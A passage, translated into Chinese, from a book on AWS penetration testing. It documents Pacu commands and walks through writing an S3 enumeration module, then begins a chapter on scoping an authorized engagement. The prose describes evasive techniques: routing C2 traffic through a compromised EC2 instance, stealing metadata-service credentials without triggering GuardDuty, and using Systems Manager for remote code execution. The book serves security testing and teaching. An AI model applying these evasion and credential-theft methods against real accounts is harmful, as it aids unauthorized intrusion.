会话区域集可以随时更改，`all`关键字可用于返回到目标每个区域（默认）。它将像区域一样使用，如`set_regions all`：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/21f9406b-955e-4c16-b441-a2087b10ea12.png)

在使用 set_regions 命令修改我们的目标之前，我们正在针对每个 AWS 区域发出警告

# run/exec <模块名称>

`run`和`exec`命令做同样的事情，即运行模块。假设我们想运行`ec2__enum`模块。我们可以首先运行`help ec2__enum`来获取一些关于它的信息，包括支持的参数。然后，我们可以使用`run`或`exec`运行模块，并通过该命令传递任何参数。

如果我们想要枚举`us-east-1`区域中的 EC2 实例，我们可以运行以下命令：

```
 run ec2__enum --instances --regions us-east-1 
```

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/b798613a-9831-4b8b-9ca8-bfa250874c96.png)

使用实例和区域参数运行 ec2__enum 模块

如您所见，我们指定了`--instances`参数，只枚举 EC2 实例，并指定了`--regions`参数，只枚举`us-east-1`区域中的 EC2 实例。

前面的屏幕截图还提出了模块输出的另一个重要点-模块摘要部分。每个模块都有一个模块摘要，其目的是在一个小的输出部分中提供模块的输出。有时，根据您运行的模块的配置，输出可能跨越多个屏幕，并且可能如此之长，以至于超出了您的终端历史记录。为了帮助解决这个问题，引入了模块摘要，以提供模块在执行过程中的发现或操作的摘要。

# set_keys

我们在本书中已经多次使用了`set_keys`命令。此命令用于向当前 Pacu 会话添加密钥集，或更新任何现有的密钥集。如前所述，如果您在没有设置任何密钥的情况下运行`set_keys`命令，您将设置 Pacu 中的第一个或默认密钥集。之后，`set_keys`命令将自动尝试使用它提供的默认值更新活动密钥集，但您可以通过修改提示的密钥别名来更改以添加另一个密钥集。

与一组密钥相关联的密钥别名实质上仅供您自己使用，因此当准备好时，您可以识别它们是什么密钥。通常，这意味着将密钥别名设置为拥有密钥的用户或角色的名称是最合理的。在其他情况下，可能更有意义的是描述提供的密钥集的访问权限。假设一位客户发送给您两组密钥，一组具有管理员级别访问权限，另一组具有开发人员级别的访问权限。在这种情况下，将它们命名为“管理员”和“开发人员”，或者类似的名称，而不是他们的用户名，可能更有意义。

正如您可能已经注意到的那样，Pacu 存储您的秘密访问密钥的任何地方，它需要反映到屏幕上，Pacu 将对该值进行审查。这样秘密访问密钥就不会被记录到 Pacu 命令/错误日志中，这样任何其他日志或偷窥者也无法访问。

# 交换密钥

我们已经看过 `swap_keys` 命令，但是当使用包含多组活动密钥的会话时，这个命令非常有用。通过运行 `swap_keys`，您将看到一个可用密钥列表，您可以选择其中一个成为活动密钥集。活动密钥集是在运行任何需要进行身份验证的 AWS 模块时使用的密钥集。

# import_keys <profile name>|--all

`import_keys` 命令旨在使 Pacu 和 AWS CLI 之间的桥梁更加容易。此命令将从 AWS CLI 导入凭据配置文件，并在活动会话中创建一个新的密钥集。如果要导入单个 AWS CLI 配置文件，可以在命令中直接命名，就像下面的屏幕截图中运行 `import_keys default` 一样：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/ac5d1799-fb00-43b6-acb4-d76a73d61450.png)

导入 AWS CLI 默认配置文件的密钥

如前面的屏幕截图所示，我们将 `default` AWS CLI 配置文件导入为 `imported-default` 键别名，以指示这些密钥已被导入，并且配置文件名称为 `default`。我们还可以看到活动密钥集从 `SecondExampleUser` 切换到 `imported-default`。如果需要，我们可以使用 `swap_keys` 命令将它们切换回来。

我们还可以使用 `--all` 标志而不是 AWS CLI 配置文件名称，Pacu 将导入它可以找到的每个 AWS CLI 配置文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/f3e45c17-beba-42cf-b7de-5778c061baab.png)

使用 --all 参数从 AWS CLI 导入多个密钥对

# exit/quit/Ctrl + C

输入 `exit` 或 `quit` 命令，或按下键盘上的 *Ctrl* + *C* 键，如果您在主菜单上，Pacu 将会优雅地退出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/84c2dcd7-79d2-4ed2-ab73-eab27ae7f84e.png)

退出 Pacu 并返回到我的终端

*Ctrl* + *C* 还有另一个用途；当模块正在执行时按下 *Ctrl* + *C*，该模块的执行将退出，您将返回到主要的 Pacu CLI。以下屏幕截图显示了使用 *Ctrl* + *C* 退出 `ec2__enum` 模块的执行（`^C` 是 *Ctrl* + *C* 在终端中显示的方式）：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/b6ee2ff2-9bc4-472f-917f-3e39beddfe14.png)

使用 *Ctrl* + *C* 组合键退出 ec2__enum 模块

# aws <command>

`aws` 命令与其他 Pacu 命令有些不同。这本质上是一个直接将 AWS CLI 集成到 Pacu 中的命令，因此您可以在不退出 Pacu 的情况下运行 AWS CLI 命令。它的工作方式是，如果 Pacu 检测到以 `aws` 开头的命令作为第一个单词运行，它将把整个命令传递到主机上的 bash shell。这意味着您可以将 Pacu 中的任何 `aws` 命令视为 `bash` 命令，因为它就是。这使您可以将 AWS CLI 命令的输出管道或重定向到系统上需要的任何位置。

非常重要的一点是，Pacu 和 AWS CLI 使用两种不同的凭据存储方法。Pacu 独立处理其凭据，而 AWS CLI 单独处理其凭据。这意味着，如果您在 Pacu 中使用 `SecondExampleUser` 作为活动密钥集，AWS CLI 将**不会**使用相同的凭据，除非您在 AWS CLI 中正确指定。AWS CLI 将正常运行，就好像您从 `bash` 命令行中运行它一样，这意味着将自动使用 `default` AWS CLI 配置文件，除非您使用 `--profile` 参数指定其他配置文件。

下面的屏幕截图显示了在 Pacu 中运行 `aws ec2 describe-instances` 命令，并且因为它被传递到 bash shell，然后被传递到 `grep`，以便可以搜索 `ImageId` 一词，并且我们可以看到找到的 EC2 实例的镜像 ID：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/ad90bcfd-220b-49fc-aec1-5c9d19c3ce68.png)

从 ec2 describe-instances API 调用的输出中提取 ImageId

我们没有指定要使用的 AWS CLI 配置文件，因此它自动使用了默认配置文件，而不是`SecondExampleUser`的 Pacu 密钥对。

# proxy <command>

`proxy`命令与内置的命令和控制功能`PacuProxy`相关联。`proxy`命令接受几个不同的子命令：

+   `start <ip> [port]`

+   `stop`

+   `kill <agent_id>`

+   `list/ls`

+   `use none|<agent_id>`

+   `shell <agent_id> <command>`

+   `fetch_ec2_keys <agent_id>`

+   `stager sh|ps`

我们不会深入研究这些命令各自的功能，但我们将在本章末尾的*PacuProxy 简介*部分更深入地了解 PacuProxy。这是因为`PacuProxy`仍在开发中，当前发布版本不一定是最终版本，但其总体主题和目标保持不变。如果您有兴趣了解 Pacu 和 PacuProxy 的更高级功能，可以访问 GitHub 上 Pacu Wiki 的*高级功能*部分：[`github.com/RhinoSecurityLabs/pacu/wiki/Advanced-Capabilities`](https://github.com/RhinoSecurityLabs/pacu/wiki/Advanced-Capabilities)。

在尝试处理目标 AWS 帐户中受损的 EC2 主机时，将使用这些代理命令，但我们稍后会探讨这一点。

# 创建一个新模块

Pacu 旨在允许外部对其自身和其中包含的模块进行贡献。这就是为什么它是以这种方式构建的，并在 BSD-3 开源许可下发布的原因。它是用 Python3 编写的，因此它的所有模块也都是用 Python3 编写的。

Pacu 带有一个模板，存储在`./modules/template.py`文件中，这使得您可以轻松开始编写自己的模块。它包括使您的模块工作所需的一切，以及一些示例，说明您可以如何使用 Pacu 核心程序公开的不同 API 来使构建您的模块更容易。

# API

在开始之前，了解通过 Pacu 核心 API 可用的方法是很有用的。以下是一些更重要的方法：

+   `session/get_active_session`

+   `get_proxy_settings`

+   `print/input`

+   `key_info`

+   `fetch_data`

+   `get_regions`

+   `install_dependencies`

+   `get_boto3_client/get_boto3_resource`

# session/get_active_session

`session`变量是在每个 Pacu 模块的主函数开始时创建的。通过调用`get_active_session` Pacu API（导入为`pacu_main`）来定义。此变量包含有关当前 Pacu 会话的所有信息，包括身份验证信息、AWS 服务数据以及 Pacu 存储的任何其他信息。

您可以使用以下方式复制存储在 EC2 服务中的所有数据：

```
   ec2_data = copy.deepcopy(session.EC2) 
```

然后，您可以对`ec2_data`进行修改，当您准备将其写入数据库时，可以在`session`上使用`update`方法：

```
   session.update(pacu_main.database, EC2=ec2_data) 
```

这行代码实际上是使用`ec2_data`中存储的内容更新`pacu_main.database`数据库中的`EC2`部分。最好将会话对象视为数据不可变，然后在最后进行更新，以防止模块在执行过程中遇到错误时出现数据库内容问题。

# get_proxy_settings

`pacu_main.get_proxy_settings`方法用于获取当前会话中`PacuProxy`的信息。这种方法在任何正常使用情况下的模块中可能不会被使用，并且在需要与会话的代理设置进行交互/读取的`PacuProxy`特定模块中可能更有意义。

# print/input

`print`和`input`方法是从`pacu_main`导入的，并且用于覆盖 Python 默认的`print`和`input`方法。这两个覆盖允许将打印到屏幕的任何文本或输出写入 Pacu 活动日志。它们还添加了一些参数，让您可以自定义打印方式。例如，也许您只想将某些内容打印到命令日志，而不是屏幕；在这种情况下，您可以使用`output='file'`参数。或者，也许您只想将输出打印到屏幕，但不要将其记录到命令日志中，在这种情况下，您可以使用`output='screen'`参数。

`print`命令还将接受 JSON 字典作为其值，然后使用`json`库将输出转储为格式化的、易于阅读的视图。在这些情况下，输出是字典时，`print`函数将递归扫描字典，查找`SecretAccessKey`的任何出现。如果找到任何内容，它将在打印或记录之前对其进行审查，以便您的秘密密钥不以明文形式记录到 Pacu 屏幕/命令日志中。

# key_info

`key_info`方法用于获取当前会话中活动的 AWS 密钥集的信息。返回的数据与 Pacu CLI 中`whoami`命令的输出非常相似，但这提供了一个用于检索数据的编程接口。您可以将名为`user`的变量的值设置为`key_info()`，然后就可以访问当前用户的标识信息（如名称、ARN 和帐户 ID），以及从`iam__enum_permissions`模块枚举的权限。

# fetch_data

`fetch_data`方法用于允许模块开发人员以特定目标编写模块。例如，编写一个更改 EC2 实例设置的模块的人不应该担心枚举 EC2 实例。他们应该能够假设数据可用，并编写代码以便与之一起使用。在幕后，`fetch_data`函数接受您传递的参数，包括请求的数据、如果数据不可用则枚举该数据的模块，以及在运行该模块时传递给该模块的任何其他参数。

让我们考虑以下代码块：

```
if fetch_data(['EC2', 'SecurityGroups'], 'ec2__enum', '--security-groups') is False:
        print('Pre-req module not run successfully. Exiting...')
        return
```

在第一行，我们看到一个`if`语句正在检查`fetch_data`的返回值是否为 false，然后报告先决条件模块未成功运行，因此正在退出当前模块。

如果您想在自己的模块中使用 EC2 安全组，您将使用此代码块来获取该数据。首先，`fetch_data`方法将检查本地 Pacu 数据库，看它是否已经枚举了 EC2 安全组的任何内容。如果有，它将返回`true`，模块编写者可以假设数据现在在数据库中。如果`fetch_data`在数据库中找不到数据，它将运行作为第二个参数传递的模块，并使用作为第三个参数传递的标志。在这种情况下，如果找不到 EC2 安全组，它将运行`ec2__enum`模块，并传递`--security-groups`参数。

然后模块将执行并枚举所需的数据。如果成功，它将返回`true`，原始模块将继续执行。但是，如果不成功，它将返回`false`，表示无法枚举必要的数据，应向用户显示原因。

# 获取区域

`get_regions`方法是为了让模块开发者不需要担心需要或想要定位的区域。你只需要编写你的模块，就好像每次运行时都会针对一系列区域运行一样。你可以使用`get_regions`来获取区域列表，只需要提供一个 AWS 服务名称。`get_regions('EC2')`将返回支持 EC2 服务的所有区域。

如果用户使用`set_regions`命令设置了会话区域，那么`get_regions('EC2')`将只返回支持 EC2 并在会话区域列表中的区域。因此，作为模块开发者，你实际上不需要考虑区域，只需要假设可能需要定位任意数量的区域，并且在编写模块时没有提供这些信息。

# install_dependencies

`install_dependencies`方法基本上已经被弃用，因为在撰写本文时，只有一个模块使用它，并且已经有计划以不同的方式整合这个功能。目前，它用于安装模块所需的外部依赖。

例如，使用这种方法的模块之一是`s3__bucket_finder`模块，它使用 Git 克隆一个第三方工具，并下载一个它所需的单词列表。如果一个依赖项本身是另一个 Git 存储库，或者太大而无法定期包含在 Pacu 中，这可能是有帮助的。

由于这种方法的使用缺乏和其他安全问题，这个功能很可能很快就会从 Pacu 中移除。

# get_boto3_client/get_boto3_resource

`get_boto3_client`和`get_boto3_resource`方法允许你与 boto3 Python 库进行交互，而无需担心一大堆配置选项。由于`PacuProxy`、GuardDuty Kali/Parrot/Pentoo 用户代理绕过和身份验证的要求，所有复杂的配置选项都已经从模块开发者看到的内容中抽象出来。在后台，仍然可以修改这些配置，但是模块很少需要这种粒度的配置。

这些函数使得在单个区域创建`boto3`客户端可以从以下混乱开始：

```
client = boto3.client(
    'ec2',
    region_name='us-east-1',
    aws_access_key_id='AKIAEXAMPLEKEY',
    aws_secret_access_key='examplekeyexamplekeyexamplekey',
    aws_session_token='examplesessiontokenexamplesessiontokenexamplesessiontokenexamplesessiontokenexamplesessiontokenexamplesessiontokenexamplesessiontoken',
    config=botocore.config.Config(
        proxies={'https': 'socks5://127.0.0.1:{}'.format(socks_port), 'http': 'socks5://127.0.0.1:{}'.format(socks_port)} if not proxy_settings.target_agent == [] else None,
        user_agent=user_agent,
        parameter_validation=parameter_validation
    )
)
```

你可以将它转换成更简洁、更短的代码行：

```
client = pacu_main.get_boto3_client('ec2', 'us-east-1')
```

在 Pacu 中，这两行代码本质上是做同样的事情，但第一行要长得多，并且需要很多你作为模块开发者不必担心的信息。

# 模块结构和实现

通过查看 Pacu 附带的模板模块文件中的内容，可以很容易了解 Pacu 模块结构。该文件中的每一行和部分都有注释，描述了它在做什么以及为什么要这样做。如果你更喜欢具体的例子，那么检查一些枚举模块的代码可能是有意义的，因为它们往往更简单，并且它们都与数据库交互。

假设我们想编写一个模块，枚举账户中存在的存储桶，并将该信息保存到 Pacu 数据库中。总的来说，这应该是一个非常简单的模块。我们将进一步进行一步，甚至考虑已经编写了一个枚举 S3 存储桶并打印出它们的脚本。该脚本可能如下所示：

```
import boto3
import botocore

try:
    client = boto3.client('s3')

    buckets = client.list_buckets()['Buckets']

    print(buckets)
except botocore.exceptions.ClientError as error:
    print('Failed to list S3 buckets: {}'.format(error))
```

这是一个非常简单的脚本，带有一些小的错误处理，但在使用上并不是非常灵活，因为目前它只会使用默认的 AWS CLI 配置文件进行身份验证，因为在创建 boto3 客户端时没有指定凭据。

现在，让我们来看一个干净的模块模板。这是在删除所有命令和一些我们不会使用的示例脚本后模板的样子：

```
#!/usr/bin/env python3
import argparse
from botocore.exceptions import ClientError

module_info = {
    'name': 's3__enum',
    'author': 'Example author of Example company',
    'category': 'ENUM',
    'one_liner': 'Enumerates S3 buckets in the target account.',
    'description': 'This module enumerates what S3 buckets exist in the target account and saves the information to the Pacu database.',
    'services': ['S3'],
    'prerequisite_modules': [],
    'external_dependencies': [],
    'arguments_to_autocomplete': [],
}

parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])

def main(args, pacu_main):
    session = pacu_main.get_active_session()
    args = parser.parse_args(args)
    print = pacu_main.print

    return data

def summary(data, pacu_main):
    return 'Found {} S3 bucket(s).'.format(len(data['buckets']))
```

我们已经填写了`module_info`变量，其中包含解释我们的 S3 枚举模块所需的数据，所以现在我们只需要移植我们的代码。此外，我们已经从`pacu_main`中删除了任何在此模块中不会使用的导入，例如`input`覆盖。这是因为我们不会在模块中要求用户输入，但我们会打印文本，所以我们保留`print`覆盖。

如果我们回到我们原来的 S3 脚本，我们基本上只需将 try/except 块复制到 Pacu 模块的`main`方法中。然后，我们需要做一些更改。我们不再想用`boto3.client`创建一个 boto3 客户端，而是想使用`pacu_main.get_boto3_client`，所以我们将`client = boto3.client('s3')`替换为`client = pacu_main.get_boto3_client('s3')`。您可能已经注意到在模板文件的顶部`from botocore.exceptions import ClientError`，这意味着我们可以将我们的错误处理从`botocore.exceptions.ClientError`更改为`ClientError`，它将像以前一样工作。

我们不想打印出存储桶，而是想将它们存储在某个地方，以便我们可以在摘要中引用，在函数中引用，并在 Pacu 数据库中引用。

为了做到这一点，我们将声明一个`data`变量，它将在模块执行期间保存所有相关数据，并且它将有一个`Buckets`键，该键保存从 AWS 返回的存储桶信息。

现在我们的 S3 脚本已经从之前看到的内容改变为以下内容：

```
data = {'Buckets': []}

try:
    client = pacu_main.get_boto3_client('s3')

     data['Buckets'] = client.list_buckets()['Buckets']
except botocore.exceptions.ClientError as error:
    print('Failed to list S3 buckets: {}'.format(error))
```

现在我们有了存储桶名称的列表，所以我们将使用`session`变量将它们存储在数据库中。在这种情况下，我们不关心数据库中已经存储的 S3 数据，因为我们正在枚举一个新列表，而不是更新任何现有的内容。因此，我们不需要将数据从数据库中复制出来，更新它，然后再放回去。我们可以直接用我们的更新覆盖它。

这将看起来像这样：

```
    session.update(pacu_main.database, S3=data)
```

完成后，数据库将保存一个包含 S3 部分中 S3 存储桶列表的对象，并且对当前会话的任何用户都可以获取。

现在模块已经完成。要将其集成到 Pacu 中，我们只需在 Pacu 的模块文件夹中创建一个名为`s3__enum`的新文件夹（因为我们在`module_info`部分中命名为这样），将模块脚本保存为该文件夹中的`main.py`，在该文件夹中也创建一个空的`__init__.py`文件，然后启动 Pacu。我们现在应该能够在列出模块或搜索模块时看到我们的模块，这意味着我们现在也能够执行它并接收有效的结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/79831874-b3d2-4189-9228-0962625218fd.png)

搜索并运行我们的新模块

这很简单，但在几分钟内，我们就能够将一个普通的 Python 脚本转换为一个 Pacu 模块，几乎没有什么麻烦。

整个模块的最终代码看起来是这样的：

```
#!/usr/bin/env python3

# Import the necessary libraries
import argparse
from botocore.exceptions import ClientError

# Declare the required module info for the Pacu UI
module_info = {
    'name': 's3__enum',
    'author': 'Example author of Example company',
    'category': 'ENUM',
    'one_liner': 'Enumerates S3 buckets in the target account.',
    'description': 'This module enumerates what S3 buckets exist in the target account and saves the information to the Pacu database.',
    'services': ['S3'],
    'prerequisite_modules': [],
    'external_dependencies': [],
    'arguments_to_autocomplete': [],
}

# Define our argument parser, for if our module supported any arguments
parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])

# Begin the main function, which is run when the module itself is run
def main(args, pacu_main):
    # Setup our session, arguments, and override the print function
    session = pacu_main.get_active_session()
    args = parser.parse_args(args)
    print = pacu_main.print

    # Create a variable to store data in as we enumerate it
    data = {'Buckets': []}

    # Attempt to list the buckets in the target account, catching any potential errors
    try:
        client = pacu_main.get_boto3_client('s3')

        data['Buckets'] = client.list_buckets()['Buckets']
    except ClientError as error:
        print('Failed to list S3 buckets: {}'.format(error))

    # Update the Pacu database with the S3 data that we enumerated
    session.update(pacu_main.database, S3=data)

    return data

# Define our summary function that outputs a short summary of the module execution after it is done
def summary(data, pacu_main):
    return 'Found {} S3 bucket(s).'.format(len(data['Buckets']))
```

现在，最后注意一点，如果我们在之前的同一个会话中运行`services`命令，它现在应该包含 EC2 和 S3 的数据，正如预期的那样：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/96714861-a45d-4d2b-8c0f-15f566bcdc4f.png)

服务现在输出 EC2 和 S3，因为它们现在都在数据库中有数据

这也意味着我们可以运行`data S3`命令来获取任何 S3 数据，如果我们愿意的话。

# PacuProxy 简介

**PacuProxy**在本书中已经多次提到，但通常只是随意地提及。这是因为 PacuProxy 旨在解决攻击 AWS 环境时的一个非常特定的问题，这通常超出了大多数转向云端的公司的安全姿态。在非常基本的层面上，PacuProxy 只是另一个命令和控制框架，例如 PowerShell Empire 和 Meterpreter，但 PacuProxy 比其他类似工具更加面向云端。

PacuProxy 的重要特性（除了一般的 C2 功能，如负载生成、代理处理和模块）是它直接集成到 Pacu 的工作流程中。这意味着当您妥协了一个服务器，比如一个 EC2 实例，您可以使用 PacuProxy 作为您的 C2 通道，基本上通过受损的实例代理您的 Pacu 流量。这使您可以从自己的计算机使用 Pacu 提供的所有功能，但所有流量都经过受损的主机。当防御者查看日志并注意到您的恶意流量时，受损的 EC2 实例将显示为流量的来源，这看起来比一个他们不熟悉的随机 IP 地址更不可疑。

PacuProxy 也有自己的一套模块，可以运行，并且可以将功能集成到普通的 Pacu 模块中。一个例子是`systemsmanager__rce_ec2`模块。该模块滥用 AWS Systems Manager 服务，试图在 EC2 实例上远程执行代码，但与 PacuProxy 的集成已经内置，因此如果您运行该模块而没有指定要在实例上运行的命令，并且您有 PacuProxy 在监听，它将自动生成一个一行的分段，并在主机上执行，使您完全控制它。

PacuProxy 特定模块的一个例子是从 EC2 元数据服务中窃取凭据。您可以运行该模块，它将向该服务器的元数据服务发出 HTTP 请求，以获取可能存在的任何凭据，然后在 Pacu 中创建一组新的密钥，使用这些凭据。然后，您可以通过受损的主机路由所有这些请求，从未警告 GuardDuty 或其他人发生了妥协，即使一切都安装并在您自己的主机上运行。

PacuProxy 仍处于最初创建时设想的早期阶段，因此本节中已隐瞒了更多技术细节，因为其中任何一个提供的细节可能很快就会过时。

# 总结

Pacu 提供了广泛的功能和扩展现有功能的能力。它是为渗透测试 AWS 环境而创建的第一个模块化攻击工具，由于有人支持，它应该会长时间发展下去。在攻击 AWS 环境时，它是一个很好的资产，但它并非万能，因此重要的是要学习攻击 AWS 的基础知识，而不是依赖别人为您自动化一切。

Pacu 仍在积极开发中，因此自编写以来，功能可能已经发生变化，添加或删除，因此在遇到问题时考虑这一点是很重要的。Pacu 的开发人员可以回应在 GitHub 中打开的问题和拉取请求，因此这可能是运行 Pacu 时获得支持的最佳资源。

在本章中，我们介绍了 Pacu 的基本用法和提供的命令。我们还看了一下为其编写我们的第一个模块。希望您能从本章中学到如何有效地使用 Pacu，在 AWS 渗透测试期间执行各种攻击。

在下一章中，我们将进一步探讨并覆盖从头到尾进行 AWS 渗透测试的过程。这将帮助我们了解真实世界的 AWS 渗透测试场景，以及我们何时如何使用 Pacu 等工具，以及如何满足客户的需求和愿望。


# 第十九章：将所有内容整合在一起-真实世界的 AWS 渗透测试

在本章中，我们将从头到尾看一个真实的 AWS 渗透测试。这应该有助于将本书中许多章节联系在一起，并演示渗透测试 AWS 环境的流程。我们将跳过许多技术细节，因为它们已经在本书的各自章节中进行了概述。

在对 AWS 环境进行渗透测试时，重要的是要彻底调查每种可能的攻击，并利用你所获得的访问权限。这确保了在参与结束时向客户提供的结果是全面的、完整的和有用的，并且让他们确信他们可以放心地知道他们的基础设施得到了广泛的调查。

在本章中，我们将在不同的地方引用两个 IAM 用户。一个 IAM 用户将被称为`PersonalUser`。`PersonalUser`是我们在自己的攻击者控制的 AWS 账户中创建的 IAM 用户，用于跨账户枚举等活动。此用户需要具有`iam:UpdateAssumeRolePolicy`和`s3:ListBucket`权限，以使跨账户侦察正常工作。另一个 IAM 用户将被称为`CompromisedUser`，这个用户是我们在这次攻击场景中被攻陷的用户，并且我们将在整个正常过程中使用。我们的情景将模拟一个使用 AWS 的公司`Acme Co.`，来到我们的渗透测试公司，寻求 AWS 渗透测试。

在本章中，我们将涵盖以下主题：

+   渗透测试启动

+   未经身份验证的侦察

+   经过身份验证的侦察加上权限枚举

+   权限提升

+   持久性

+   后期利用

+   合规性和最佳实践审计

# 渗透测试启动

在进行渗透测试和黑客攻击之前，与客户一起进行启动过程非常重要，以确保每个人都了解渗透测试的范围、对环境的访问权限类型、渗透测试的目标等。这个过程是必要的，因为在渗透测试业务中没有人喜欢意外，沟通可以让每个人都满意。在本节中，我们将涵盖在渗透测试开始之前需要做的一些重要方面。

# 范围确定

AWS 渗透测试（或任何类型的渗透测试）最重要的一个方面是确定参与范围。在传统的范围确定方法方面，如 IP 地址数量、用户数量、Web 应用程序大小等，AWS 参与范围很难确定。这需要一些更个人化的方法，因为无论规模大小，我们都可以运行一些扫描程序并结束一天，但这并不是渗透测试的全部内容，如果这是你处理事情的方式，将会给你的公司带来负面影响。需要大量手动工作来进行 AWS 渗透测试，以深入挖掘并发现潜在的漏洞，因此很重要适当确定范围，以便有足够的时间进行深入评估，但不要浪费自己和客户的时间和金钱。

很难提供一个确切的方法来确定 AWS 参与范围，但以下问题清单可以帮助提供客户环境的背景信息，以帮助确定其规模。

+   您是否为此环境使用了多个 AWS 账户？

+   有多少个？

+   您是否有兴趣让它们全部进行测试，还是只是部分？

+   环境将提供什么样的访问权限？

+   您使用了哪些 AWS 服务？有多少个？

+   您的资源跨越了多少个地区？

+   您使用了多少个 EC2 实例/ Lambda 函数？

+   您有多少个 IAM 用户、角色和组？

+   您的用户如何访问您的环境？（常规 IAM 用户、SSO | AssumeRole 等）

除了这些问题，还可以询问关于他们正在使用的其他 AWS 服务的更具体的问题。您有多少 RDS 数据库？如果他们甚至没有使用 RDS 服务，这个问题就没有意义，但类似于您有多少 Lightsail 实例？可能会有意义。除非客户告诉您他们使用 Lightsail，否则这种情况通常不会出现。

这些问题旨在让您对您计划攻击的 AWS 环境有一个基本的了解。然后，这可以帮助您确定完全测试需要多长时间。

这些问题非常具体，它们可能会因客户而异。这是因为，例如，您可能正在测试一个拥有 5000 个 EC2 实例、300 个 Lambda 函数和 100 个 RDS 数据库的环境，但客户只想为一个具有 IAM 权限和一些 Lightsail 权限的单个用户提供访问权限。在这一点上，EC2、Lambda 和 RDS 背后的数字几乎是无关紧要的，因为除非您能在环境中提升权限，否则根据客户的期望，您将不会触及这些服务。

# AWS 渗透测试规则和指南

在开始进行 AWS 渗透测试之前，确认您不会违反 AWS 关于渗透测试的规定非常重要。截至 2019 年 3 月，AWS 不再要求对多个不同服务进行渗透测试的批准，但仍然有一份在其渗透测试页面上列出的禁止活动清单。有关渗透测试 AWS 基础架构的有用信息，例如您必须遵循的限制，可以在这里找到：[`aws.amazon.com/security/penetration-testing/`](https://aws.amazon.com/security/penetration-testing/)。我们不希望在不了解规则的情况下开始渗透测试，因为那样我们就有可能违反 AWS 的可接受使用政策([`aws.amazon.com/aup/`](https://aws.amazon.com/aup/))，这可能会导致目标账户被暂停或完全终止。这些信息必须在我们与客户合作之前传达给我们的客户，否则我们可能会延迟开始。

需要注意的是，AWS 规定我们的政策只允许在他们的渗透测试页面上测试以下资源：EC2、RDS、Aurora、CloudFront、API Gateway、Lambda、Lightsail 和 Elastic Beanstalk。这一部分听起来好像我们不能对整个 AWS 环境进行渗透测试，但是指的是传统的渗透技术，比如端口扫描、CVEs/漏洞利用、暴力破解等。它并不是指我们在本书中所指的渗透测试的一切，因为其中大部分只是使用 AWS API 在账户中执行特定操作，这并不违反 AWS 的可接受使用政策。例如，我们可以尝试利用 AWS 系统管理器中的配置错误，通过使用 AWS API 来尝试远程访问 EC2 实例，但我们不能对 AWS ElastiCache 实例进行端口扫描并尝试利用缓冲区溢出，因为这些规则。

# 凭据和客户期望

在处理 AWS 渗透测试授权表格之后（或在过程中），下一步将是确定客户对 AWS 渗透测试期望的具体内容。这是一个红队风格的合作吗，我们的活动将受到蓝队的积极监视和防御？这只是对配置的审计吗？这是一种尽可能深入的合作，没有对我们进行积极的防御？

除此之外，客户是否提供给我们凭据？如果是，有多少用户的凭据以及我们得到了关于他们的什么信息？如果没有，我们是否应该进行社会工程来获取访问权限？

其他重要的问题可能包括以下内容：

+   这是一个测试/开发/生产环境吗？

+   在环境中有什么是我们不应该触碰的？

+   是否有其他用户正在积极使用这个环境？

还有许多其他关于范围的问题需要问，这最终取决于您作为渗透测试公司的做法以及您的客户作为您的客户的需求。在本章中，我们将假设一个情景，即我们为单个 IAM 用户提供了一组密钥，没有其他内容。这意味着我们不知道可以期望什么样的访问权限，以及他们的基础架构从内部是如何工作的。此外，在我们的情景中，我们将假设没有一个正在试图阻止和关闭我们访问的活跃的蓝队，但我们将受到账户中现有工具的监视。出于所有这些原因，这意味着我们应该将这次参与视为我们刚刚窃取了他们提供给我们的密钥的访问权限，并且模拟攻击，就好像我们是一个真正的攻击者，尽管我们知道蓝队不会阻止我们。

这些类型的参与对客户来说可能非常有用，因为它为他们提供了各种信息。它为我们渗透测试人员提供了充分的能力来展示*可能发生的情况*，当他们的密钥被泄露时，它为他们提供了（云）日志和活动的记录，以查看他们正在检测到的攻击类型，他们错过了什么，甚至允许他们分析这些数据，就好像这是一种事件响应/取证类型的情况。如果蓝队在参与期间积极地关闭我们，我们可能无法发现 AWS 环境中的所有实际漏洞，因为我们的访问被阻止了。没有蓝队的干扰，我们可以尽可能深入地进行，它还允许我们对账户中的服务和资源执行配置和最佳实践审核。在真实的**红队**类型的情况下，检查某些配置问题和最佳实践是没有意义的，因为它不会直接有益于我们的攻击，只会在我们的活动中留下更多的记录。

除了攻击叙述之外，提供审计和配置检查对客户来说可能非常有用，以符合账户内的合规性和安全性，因此最好能够提供这些信息。另一方面，客户想要什么是最重要的，因此必须根据他们的要求修改这个攻击叙述。

一旦客户端期望已确定，AWS 渗透测试授权表已获批准，并且您已收到凭证，您几乎可以开始了。

# 安装

在开始任何实际工作之前，我们需要确保我们已正确设置。这种设置可能看起来不同，但对于这种情况，我们需要确保 AWS CLI 和 Pacu 都已安装在我们的系统上。如何执行此操作的说明已在前几章中进行了审查，但作为提醒，您可以从其 GitHub 页面获取 Pacu，通过 Python `pip`获取 AWS CLI：

+   [`github.com/RhinoSecurityLabs/pacu`](https://github.com/RhinoSecurityLabs/pacu)

+   [`docs.aws.amazon.com/cli/latest/userguide/cli-chap-install.html`](https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-install.html)

安装了这些工具之后，我们将希望将我们可用的 AWS 密钥集成到这些工具中。这样做的最简单方法是使用 AWS CLI 创建凭据配置文件，然后将该配置文件导入 Pacu。对于我们之前提到的`PersonalUser`和`CompromisedUser`一组密钥，我们将使用`aws configure`命令，并使用`--profile`参数，指定每个名称，如下所示：

```
aws configure --profile PersonalUser
aws configure --profile CompromisedUser
```

